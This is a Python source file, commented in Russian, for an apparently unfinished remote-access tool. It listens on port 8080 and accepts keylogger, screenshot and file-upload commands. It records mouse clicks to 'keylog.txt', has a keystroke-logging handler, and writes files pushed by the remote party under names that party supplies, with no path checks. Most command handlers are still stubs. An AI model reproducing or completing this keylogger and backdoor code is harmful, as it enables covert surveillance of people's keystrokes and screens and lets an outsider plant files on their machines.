import socket
import threading
import atexit
import struct
import pickle
import pyautogui
from pynput import keyboard, mouse

# Глобальные переменные
recording = False
output = None
keyboard_listener = None
FILE_NAME = 'keylog.txt'

def log_action(action):
    print(action)

def on_press(key):
    if recording:
        # Запись нажатия клавиш в файл
        output.write(f"{key}\n")

def on_click(x, y, button, pressed):
    if recording:
        # Запись нажатий мыши в файл
        output.write(f"Mouse {'pressed' if pressed else 'released'} at ({x}, {y}) with {button}\n")

def clear_log_file():
    with open(FILE_NAME, "w") as f:
        f.write("")

def onexit():
    if output:
        output.close()


def handle_client(conn):
    print("Client connected")
    while True:
        try:
            command = conn.recv(1024).decode('utf-8')
            if not command:
                print("Connection closed by client.")
                break  # Завершаем цикл, если нет команды

            print(f"Received command: {command}")

            if command == "keylogger_start":
                # Логика старта кейлоггера
                conn.sendall("Keylogger started.".encode('utf-8'))

            elif command == "keylogger_stop":
                # Логика остановки кейлоггера
                conn.sendall("Keylogger stopped.".encode('utf-8'))

            elif command == "keylogger_show":
                # Логика показа логов
                conn.sendall("Logs shown.".encode('utf-8'))

            elif command == "keylogger_clear":
                # Логика очистки логов
                conn.sendall("Logs cleared.".encode('utf-8'))

            elif command == "screenshot":
                # Логика снятия скриншота
                conn.sendall("Screenshot taken.".encode('utf-8'))

            elif command.startswith("receive_file:"):
                file_name = command.split(":")[1]  # Получаем имя файла из команды
                print(f"Receiving file: {file_name}")
                conn.sendall(b"READY_TO_RECEIVE")  # Отправляем подтверждение готовности

                total_size = struct.unpack("L", conn.recv(8))[0]  # Получаем размер файла
                print(f"Receiving file of size {total_size} bytes...")

                received_data = b""
                bytes_received = 0

                with open(file_name, "wb") as f:
                    while bytes_received < total_size:
                        data = conn.recv(1024)
                        if not data:
                            print("Connection closed during file transfer.")
                            break  # Выход, если соединение закрыто
                        f.write(data)
                        received_data += data
                        bytes_received += len(data)
                        print(f"Received {bytes_received} of {total_size} bytes")

                print(f"File received and saved as '{file_name}'")

        except Exception as e:
            print(f"An error occurred: {e}")
            break  # Выход при возникновении ошибки

    conn.close()  # Закрытие соединения
    print("Connection closed.")


# Основная функция для запуска сервера
def start_server():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
        server_socket.bind(('0.0.0.0', 8080))
        server_socket.listen(1)
        print("Server listening on port 8080")
        while True:
            conn, addr = server_socket.accept()
            print(f"Connection from {addr}")
            threading.Thread(target=handle_client, args=(conn,)).start()

if __name__ == "__main__":
    try:
        # Запускаем слушатели для мыши
        mouse_listener = mouse.Listener(on_click=on_click)
        mouse_listener.start()

        start_server()

    except KeyboardInterrupt:
        print("\nServer stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        mouse_listener.stop()
        onexit()